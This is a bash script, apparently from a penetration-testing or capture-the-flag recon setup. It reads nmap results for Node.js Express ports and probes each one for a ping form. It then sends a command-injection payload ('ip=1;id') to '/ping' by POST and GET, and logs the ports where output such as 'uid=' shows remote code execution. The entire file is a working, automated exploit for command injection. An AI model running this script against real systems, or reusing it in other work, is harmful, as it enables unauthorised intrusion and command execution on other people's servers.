#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
NMAP_FILE=${2:?NMAP_FILE}
PRIMARY_PORT=${3:?PRIMARY_PORT}
TO=${4:-8}
OUT_BASE=${5:-/workspace/recon/httpx}
DIR="$OUT_BASE/${IP}_node_ping"
mkdir -p "$DIR"
# Collect Node.js Express ports
PORTS=$(awk '/\/tcp\s+open\s+http\s+Node\.js Express framework/{print $1}' "$NMAP_FILE" | cut -d/ -f1 | sort -n | uniq)
# Always include primary just in case
PORTS="$PORTS $PRIMARY_PORT"
printf '%s\n' $PORTS | awk 'NF' | sort -n | uniq > "$DIR/ports.txt"
# Probe each port
: > "$DIR/rce_ports.txt"
while read -r p; do
  [ -z "$p" ] && continue
  base="http://$IP:$p"
  # Fetch index
  curl -fsS -m "$TO" --connect-timeout "$TO" -i "$base/" > "$DIR/${p}_index.head" 2>/dev/null || true
  # Check hints for ping form
  if rg -q "(?i)ping|name=\"ip\"|/ping|action=\"/ping\"" "$DIR/${p}_index.head" 2>/dev/null; then
    # Try POST injection to /ping
    RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode 'ip=1;id' "$base/ping" || true)
    printf '%s\n' "$RES" | head -n 5 > "$DIR/${p}_ping_post.txt"
    # Try GET injection as fallback
    RESG=$(curl -fsS -m "$TO" --connect-timeout "$TO" -s "$base/ping?ip=1;id" || true)
    printf '%s\n' "$RESG" | head -n 5 > "$DIR/${p}_ping_get.txt"
    if echo "$RES$RESG" | grep -qiE 'uid=|www-data|linux'; then echo "$p" | tee -a "$DIR/rce_ports.txt"; fi
  fi
  sleep 0.05
done < "$DIR/ports.txt"
sed -n '1,80p' "$DIR/rce_ports.txt" || true
